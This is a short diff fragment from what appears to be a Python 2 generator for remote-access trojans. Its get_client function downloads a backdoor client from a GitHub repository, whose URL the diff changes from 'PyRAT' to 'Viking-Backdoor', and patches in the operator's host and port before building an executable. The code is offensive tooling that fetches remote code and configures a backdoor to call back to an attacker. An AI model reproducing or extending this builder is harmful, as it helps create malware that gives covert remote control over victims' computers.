@@ -18,7 +18,7 @@ Usage:
 	sys.exit()
 
 def get_client(host, port):
-	return urllib2.urlopen("https://raw.githubusercontent.com/blackvkng/PyRAT/master/source/client.py").read().replace("HOST = '127.0.0.1'", "HOST = socket.gethostbyname('%s')"%(host)).replace("PORT = 8000", "PORT = %s"%(port))
+	return urllib2.urlopen("https://raw.githubusercontent.com/blackvkng/Viking-Backdoor/master/source/client.py").read().replace("HOST = '127.0.0.1'", "HOST = socket.gethostbyname('%s')"%(host)).replace("PORT = 8000", "PORT = %s"%(port))
 
 	
 def generate_exec(host, port, source, name):
